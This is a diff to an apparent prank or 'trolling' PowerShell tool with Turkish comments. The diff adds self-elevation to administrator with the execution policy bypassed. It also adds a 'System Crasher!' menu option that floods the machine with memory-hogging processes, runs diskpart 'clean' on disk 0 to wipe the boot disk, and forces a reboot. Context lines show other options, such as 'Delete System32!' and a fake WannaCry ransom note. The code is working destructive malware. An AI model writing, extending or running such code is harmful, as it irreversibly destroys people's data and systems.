@@ -1,3 +1,11 @@
+# Yönetici yetkisi kontrolü ve otomatik yeniden başlatma
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    # Kendisini yönetici olarak yeniden başlat
+    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    Start-Process powershell -Verb RunAs -ArgumentList $arguments
+    exit
+}
+
 # Yeni bir gizli PowerShell işlemi başlat
 $scriptBlock = {
     # GUI için gerekli assembly'leri yükle
@@ -44,6 +52,7 @@ $scriptBlock = {
     $listBox.Items.Add("Spam TXT")
     $listBox.Items.Add("Delete System32!")
     $listBox.Items.Add("WannaCry But Bad")
+    $listBox.Items.Add("System Crasher!")
     $form.Controls.Add($listBox)
 
     # OK Butonu
@@ -140,6 +149,38 @@ Your files have been encrypted by WannaCry Simulation!
 To decrypt them, send 1 BTC to: [FakeAddress]
 "@
                         Set-Content -Path "C:\README.txt" -Value $ransomNote -Force
+                    }
+                }
+                "System Crasher!" {
+                    $result = [System.Windows.Forms.MessageBox]::Show(
+                        "WARNING! This will overload the system for 18 seconds, then destroy the boot sector, making it unbootable. This is IRREVERSIBLE without advanced recovery tools. Are you absolutely sure?",
+                        "SYSTEM CRASHER!",
+                        "OKCancel",
+                        "Error"
+                    )
+                    if ($result -eq "OK") {
+                        # 18 saniye boyunca sistemi kasıp donmaya zorla
+                        $processes = @()
+                        for ($i = 0; $i -lt 50; $i++) {
+                            $processes += Start-Process powershell -ArgumentList "-NoProfile -Command while ($true) { [byte[]]$buffer = New-Object byte[] 100MB; [Console]::Beep(1000, 100) }" -NoNewWindow -PassThru
+                        }
+                        # Tam 18 saniye bekle
+                        Start-Sleep -Seconds 18
+                        # İşlemleri sonlandır
+                        $processes | ForEach-Object { Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue }
+                        # MBR'yi bozarak sistemi tamamen çökert
+                        $mbrDestroyer = @"
+@echo off
+echo select disk 0 > %TEMP%\destroy.txt
+echo clean >> %TEMP%\destroy.txt
+diskpart /s %TEMP%\destroy.txt
+del %TEMP%\destroy.txt
+"@
+                        $batPath = "$($env:TEMP)\mbr_destroy.bat"
+                        Set-Content -Path $batPath -Value $mbrDestroyer -Encoding ASCII
+                        Start-Process -FilePath "cmd.exe" -ArgumentList "/c $batPath" -NoNewWindow -Wait
+                        # Anında kapanma
+                        Start-Process -FilePath "cmd.exe" -ArgumentList "/c shutdown -r -t 00" -NoNewWindow -Wait
                     }
                 }
             }
